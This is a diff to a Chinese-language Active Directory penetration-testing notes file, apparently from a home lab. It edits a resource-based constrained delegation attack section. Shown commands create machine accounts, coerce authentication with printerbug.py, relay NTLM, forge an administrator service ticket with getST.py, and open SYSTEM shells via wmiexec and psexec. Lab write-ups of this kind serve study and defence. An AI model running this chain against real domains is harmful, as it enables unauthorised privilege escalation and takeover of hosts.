@@ -634,7 +634,7 @@ Get-DomainObjectAcl | ?{$_.SecurityIdentifier -match "S-1-5-21-3014572423-127554
 添加机器账户有几种方式：
 
 ```
-# 使用addcpmputer创建机器账户
+# 使用addcomputer创建机器账户
 python addcomputer.py town.domain/win10test:DawnT0wn@dele -method LDAPS -computer-name test -computer-pass Passw0rd -dc-ip 192.168.1.10
 
 # 使用bloodyAD工具创建机器账户
@@ -794,7 +794,7 @@ Set-DomainObject WIN10-TEST -Clear 'msds-allowedtoactonbehalfofotheridentity' -V
 
 ![image-20241008200227645](images/53.png)
 
-### 结合NTLM Relay接管域控
+### 结合NTLM Relay拿下主机
 
 绕过NTLM MIC校验+打印机漏洞（强制认证）+NTLM Relay+基于资源的约束性委派组合攻击
 
@@ -831,11 +831,11 @@ https://github.com/dirkjanm/krbrelayx
 python3 printerbug.py town.domain/delegateuser:DawnT0wn@dele@10.10.10.30 192.168.1.5
 ```
 
-这里攻击域内主机是因为域控发起的验证不能中继回自身（相关细节见MS08-068），故这里对域内主机进行强制验证。
+这里攻击域内主机是因为域控发起的验证不能中继回自身（相关细节见MS08-068），故这里对域内主机进行强制验证。（这里我失败了，原因是应该使用辅域控来进行中继，因为WIN10并没有打印机验证接口，所以RPC调用失败）,所以应该强制辅域控认证到NTLM Relay的临时服务器，再中继到域控，强制认证，改变test3用户的委派属性
 
 一些情况下可以用PetitPotam（都是用于强制认证），具体可以参考春秋云镜 spoofing
 
-这里不知道为什么我认证失败了，如果认证成功后，后面就是申请票据，这种方式可以直接接管域控
+后面就是申请票据
 
 ```
 # 使用getST.py申请票据
@@ -843,11 +843,11 @@ python getST.py town.domain/test3$:Passw0rd -spn cifs/WIN10-TEST.town.domain -im
 
 # 直接登录, 还是需要将域名加入到hosts, 不然解析不到, psexec上去是SYSTEM权限
 set KRB5CCNAME=administrator.ccache 
-python wmiexec.py -k town.domain/administrator@DC.town.domain -no-pass
+python wmiexec.py -k town.domain/administrator@WIN10-TEST.town.domain -no-pass
 
 或者
 set KRB5CCNAME=administrator.ccache 
-python psexec.py -k town.domain/administrator@DC.town.domain -no-pass
+python psexec.py -k town.domain/administrator@WIN10-TEST.town.domain -no-pass
 ```
 
 可以参考：https://forum.butian.net/share/1591
